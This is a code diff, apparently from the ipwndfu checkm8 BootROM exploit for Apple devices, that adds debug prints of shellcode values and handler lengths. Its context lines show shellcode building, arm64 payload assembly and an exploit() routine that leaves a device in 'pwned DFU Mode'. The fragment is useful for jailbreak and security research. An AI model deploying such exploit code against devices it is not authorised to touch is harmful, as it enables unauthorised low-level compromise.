@@ -51,6 +51,7 @@ def libusb1_no_error_ctrl_transfer(device, bmRequestType, bRequest, wValue, wInd
   except usb.core.USBError:
     pass
 
+global hexdump
 def hexdump(start, packed_struct):
     # why is this the way it is
     payload_s = binascii.hexlify(packed_struct)
@@ -144,6 +145,7 @@ def prepare_shellcode(name, constants=[]):
   for i in range(len(constants)):
       offset = placeholders_offset + size * i
       (value,) = struct.unpack(fmt % '1', shellcode[offset:offset + size])
+      print hex(value)
       assert value == 0xBAD00001 + i
 
   return shellcode[:placeholders_offset] + struct.pack(fmt % len(constants), *constants)
@@ -484,6 +486,7 @@ def payload(cpid):
     t8015_handler = asm_arm64_x7_trampoline(t8015_handle_interface_request) + asm_arm64_branch(0x10, 0x0) + prepare_shellcode('usb_0xA1_2_arm64', constants_usb_t8015)[4:]
     t8015_shellcode = prepare_shellcode('checkm8_arm64', constants_checkm8_t8015)
     print(len(t8015_shellcode))
+    print(len(t8015_handler))
     assert len(t8015_shellcode) <= PAYLOAD_OFFSET_ARM64
     assert len(t8015_handler) <= PAYLOAD_SIZE_ARM64
     t8015_shellcode = t8015_shellcode + '\0' * (PAYLOAD_OFFSET_ARM64 - len(t8015_shellcode)) + t8015_handler
@@ -591,4 +594,5 @@ def exploit():
     sys.exit(1)
   print 'Device is now in pwned DFU Mode.'
   print '(%0.2f seconds)' % (time.time() - start)
+
   dfu.release_device(device)
